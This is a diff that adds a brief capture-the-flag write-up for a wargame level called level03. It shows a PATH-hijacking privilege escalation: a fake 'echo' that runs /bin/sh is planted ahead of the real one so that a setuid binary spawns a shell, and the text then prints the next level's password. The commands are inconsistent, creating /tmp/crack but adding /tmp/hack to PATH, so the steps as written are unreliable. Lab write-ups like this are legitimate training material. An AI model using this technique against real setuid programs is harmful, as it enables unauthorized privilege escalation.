@@ -1,0 +1,18 @@
+ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+when analyzing the executable, we see that it sets the program's id to effective user (flag03)
+and that it executes "/usr/bin/env echo Exploit me" :
+
+mkdir /tmp/crack
+cd /tmp/crack
+echo "/bin/sh" >echo
+chmod +x echo
+cd -
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/tmp/hack:/bin:/usr/games"
+	(put /tmp/hack before /bin which is echo's path)
+./level03
+
+We are now logged in as flag03 and can do the getflag command
+to get level04's password ("qi0maab88jeaj46qoumi7maus")
